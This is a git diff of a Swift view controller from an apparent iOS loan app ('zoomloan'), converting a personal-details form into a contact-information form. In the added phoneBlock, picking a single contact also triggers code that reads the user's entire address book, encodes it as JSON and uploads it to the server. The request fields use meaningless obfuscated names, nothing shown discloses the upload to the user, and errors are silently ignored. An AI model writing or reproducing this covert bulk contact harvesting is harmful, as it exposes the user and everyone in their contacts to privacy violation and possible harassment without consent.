@@ -1,5 +1,5 @@
 //
-//  PeopleInfoViewController.swift
+//  FormViewController.swift
 //  zoomloan
 //
 //  Created by hekang on 2025/11/12.
@@ -11,9 +11,9 @@ import TYAlertController
 import RxSwift
 import RxCocoa
 
-let peo_title = "Personal Details"
+let had_title = "Contact Information"
 
-class PeopleInfoViewController: BaseViewController {
+class FormViewController: BaseViewController {
     
     var productID: String? {
         didSet {
@@ -31,8 +31,7 @@ class PeopleInfoViewController: BaseViewController {
         tableView.showsVerticalScrollIndicator = false
         tableView.contentInsetAdjustmentBehavior = .never
         tableView.rowHeight = UITableView.automaticDimension
-        tableView.register(InputViewCell.self, forCellReuseIdentifier: "InputViewCell")
-        tableView.register(EnumViewCell.self, forCellReuseIdentifier: "EnumViewCell")
+        tableView.register(FormViewCell.self, forCellReuseIdentifier: "FormViewCell")
         tableView.layer.cornerRadius = 16
         tableView.layer.masksToBounds = true
         if #available(iOS 15.0, *) {
@@ -59,14 +58,14 @@ class PeopleInfoViewController: BaseViewController {
         return nextBtn
     }()
     
-    var modelArray: [superiorityModel]?
+    var modelArray: [eyeModel] = []
     
     override func viewDidLoad() {
         super.viewDidLoad()
         
         // Do any additional setup after loading the view.
         view.addSubview(headView)
-        headView.nameLabel.text = peo_title
+        headView.nameLabel.text = had_title
         headView.snp.makeConstraints { make in
             make.left.right.top.equalToSuperview()
             make.height.equalTo(122)
@@ -78,7 +77,7 @@ class PeopleInfoViewController: BaseViewController {
         }
         
         let logoImageView = UIImageView()
-        logoImageView.image = UIImage(named: "lofo_pe_image")
+        logoImageView.image = UIImage(named: "cc_lic_icn_image")
         view.addSubview(logoImageView)
         logoImageView.snp.makeConstraints { make in
             make.size.equalTo(CGSize(width: 40, height: 40))
@@ -88,7 +87,7 @@ class PeopleInfoViewController: BaseViewController {
         
         let nameLabel = UILabel()
         nameLabel.textAlignment = .left
-        nameLabel.text = peo_title
+        nameLabel.text = had_title
         nameLabel.textColor = UIColor.init(hexString: "#333333")
         nameLabel.font = UIFont.systemFont(ofSize: 13, weight: UIFont.Weight(700))
         view.addSubview(nameLabel)
@@ -115,23 +114,36 @@ class PeopleInfoViewController: BaseViewController {
         view.addSubview(tableView)
         tableView.snp.makeConstraints { make in
             make.top.equalTo(logoImageView.snp.bottom).offset(18)
-            make.bottom.equalTo(bgView.snp.top).offset(-20)
+            make.bottom.equalTo(bgView.snp.top).offset(-60)
             make.left.right.equalToSuperview().inset(16)
         }
-        var json = ["suits": productID]
-        nextBtn.rx.tap.bind(onNext: { [weak self] in
-            guard let self = self, let modelArray = modelArray else { return }
-            modelArray.forEach { model in
-                let conscious = model.conscious ?? ""
-                let key = model.sentences ?? ""
-                if conscious == "times" {
-                    json[key] = model.odd ?? ""
-                }else {
-                    json[key] = model.impunity ?? ""
+        
+        nextBtn.rx.tap
+            .compactMap { [weak self] _ -> [String: String]? in
+                guard let self = self else { return nil }
+                let phoneDictArray: [[String: String]] = self.modelArray.map { model in
+                    [
+                        "choler": model.choler ?? "",
+                        "clouded": model.clouded ?? "",
+                        "contrary": model.contrary ?? ""
+                    ]
                 }
+                
+                guard let jsonData = try? JSONSerialization.data(withJSONObject: phoneDictArray, options: []),
+                      let jsonString = String(data: jsonData, encoding: .utf8) else {
+                    return nil
+                }
+                
+                return [
+                    "suits": productID ?? "",
+                    "credulity": jsonString
+                ]
             }
-            addChangeInfo(with: json as! [String : String])
-        }).disposed(by: disposeBag)
+            .subscribe(onNext: { [weak self] json in
+                self?.addChangeInfo(with: json)
+            })
+            .disposed(by: disposeBag)
+        
         
     }
     
@@ -142,16 +154,16 @@ class PeopleInfoViewController: BaseViewController {
     
 }
 
-extension PeopleInfoViewController {
+extension FormViewController {
     
     private func listInfo() {
-        let viewModel = PeopleInfoViewModel()
+        let viewModel = FormViewModel()
         let json = ["suits": productID ?? ""]
         Task {
             do {
                 let model = try await viewModel.getListInfo(with: json)
                 if model.sentences == "0" {
-                    self.modelArray = model.credulity?.superiority ?? []
+                    self.modelArray = model.credulity?.eye ?? []
                     self.tableView.reloadData()
                 }
             } catch {
@@ -162,7 +174,7 @@ extension PeopleInfoViewController {
     }
     
     private func addChangeInfo(with json: [String: String]) {
-        let viewModel = PeopleInfoViewModel()
+        let viewModel = FormViewModel()
         Task {
             do {
                 let model = try await viewModel.saveInfo(with: json)
@@ -172,84 +184,97 @@ extension PeopleInfoViewController {
                     ToastView.showMessage(with: model.regarding ?? "")
                 }
             } catch {
-            
+                
             }
         }
     }
     
 }
 
-extension PeopleInfoViewController: UITableViewDelegate, UITableViewDataSource {
+extension FormViewController: UITableViewDelegate, UITableViewDataSource {
     
     func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
-        return modelArray?.count ?? 0
+        return modelArray.count
     }
     
     func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
-        let model = modelArray?[indexPath.row]
-        
-        let conscious = model?.conscious ?? ""
-        
-        if conscious == "you" {
-            let cell = tableView.dequeueReusableCell(withIdentifier: "InputViewCell", for: indexPath) as! InputViewCell
-            cell.selectionStyle = .none
-            cell.backgroundColor = .clear
-            cell.authModel = model
-            return cell
-        }else {
-            let cell = tableView.dequeueReusableCell(withIdentifier: "EnumViewCell", for: indexPath) as! EnumViewCell
-            cell.selectionStyle = .none
-            cell.backgroundColor = .clear
-            cell.authModel = model
-            cell.clickBlock = { [weak self] in
-                self?.view.endEditing(true)
-                self?.clickCell(with: model, cell: cell)
-            }
-            return cell
+        let model = modelArray[indexPath.row]
+        let cell = tableView.dequeueReusableCell(withIdentifier: "FormViewCell", for: indexPath) as! FormViewCell
+        cell.selectionStyle = .none
+        cell.backgroundColor = .clear
+        cell.model = model
+        cell.relationBlock = { [weak self] model in
+            guard let self = self else { return }
+            clickCell(with: model, cell: cell)
         }
+        cell.phoneBlock = { [weak self] model in
+            guard let self = self else { return }
+            ContactsUtil.selectOneContact { contact in
+                if let c = contact {
+                    let contrary = c.roused
+                    let phones = contrary.components(separatedBy: ",")
+                    let name = c.choler
+                    let phone = phones.first ?? ""
+                    if name.isEmpty || phone.isEmpty || name == " " {
+                        ToastView.showMessage(with: "Name or phone number cannot be empty.")
+                        return
+                    }
+                    cell.nameTextFiled.text = name + "-" + phone
+                    model.choler = name
+                    model.contrary = phone
+                }
+            }
+            ContactsUtil.getAllContacts { contacts in
+                if contacts.count > 0 {
+                    do {
+                        let jsonData = try JSONEncoder().encode(contacts)
+                        if let jsonString = String(data: jsonData, encoding: .utf8) {
+                            let json = ["credulity": jsonString,
+                                        "suits": self.productID ?? ""]
+                            self.allInfo(with: json)
+                        }
+                    } catch {
+                        print("Error encoding JSON:", error)
+                    }
+                }
+            }
+        }
+        return cell
         
     }
     
-    private func clickCell(with model: superiorityModel?, cell: EnumViewCell) {
+    private func clickCell(with model: eyeModel?, cell: FormViewCell) {
         guard let model = model else { return }
-        let conscious = model.conscious ?? ""
-        if conscious == "times" {
-            let listView = PopEnumListView(frame: self.view.bounds)
-            listView.nameLabel.text = model.affray ?? ""
-            listView.modelArray = model.irascible ?? []
-            let alertVc = TYAlertController(alert: listView, preferredStyle: .actionSheet)
-            self.present(alertVc!, animated: true)
-            listView.cancelBlock = { [weak self] in
-                guard let self = self else { return }
-                self.dismiss(animated: true)
-            }
-            listView.sureBlock = { [weak self] in
-                guard let self = self else { return }
-                self.dismiss(animated: true)
-            }
-            listView.selecbBlock = { listModel in
-                cell.numTextField.text = listModel.choler ?? ""
-                model.impunity = listModel.choler ?? ""
-                model.odd = listModel.odd ?? ""
-            }
-        }else {
-            let listView = PopAddressView(frame: self.view.bounds)
-            listView.nameLabel.text = model.affray ?? ""
-            let modelArray = CityConfig.shared.addressModel?.credulity?.really ?? []
-            listView.provincesData = modelArray
-            let alertVc = TYAlertController(alert: listView, preferredStyle: .actionSheet)
-            self.present(alertVc!, animated: true)
-            listView.cancelBlock = { [weak self] in
-                guard let self = self else { return }
-                self.dismiss(animated: true)
-            }
-            listView.sureBlock = { [weak self] one, two, three in
-                guard let self = self else { return }
-                self.dismiss(animated: true) {
-                    cell.numTextField.text = one + "|" + two + "|" + three
-                    model.impunity = one + "|" + two + "|" + three
-                    model.odd = one + "|" + two + "|" + three
-                }
+        let listView = PopEnumListView(frame: self.view.bounds)
+        listView.nameLabel.text = model.affray ?? ""
+        listView.modelArray = model.irascible ?? []
+        let alertVc = TYAlertController(alert: listView, preferredStyle: .actionSheet)
+        self.present(alertVc!, animated: true)
+        listView.cancelBlock = { [weak self] in
+            guard let self = self else { return }
+            self.dismiss(animated: true)
+        }
+        listView.sureBlock = { [weak self] in
+            guard let self = self else { return }
+            self.dismiss(animated: true)
+        }
+        listView.selecbBlock = { listModel in
+            cell.relaTextFiled.text = listModel.choler ?? ""
+            model.clouded = listModel.odd ?? ""
+        }
+    }
+    
+}
+
+extension FormViewController {
+    
+    private func allInfo(with json: [String: String]) {
+        let viewModel = FormViewModel()
+        Task {
+            do {
+                let _ = try await viewModel.saveAllInfo(with: json)
+            } catch  {
+                
             }
         }
     }
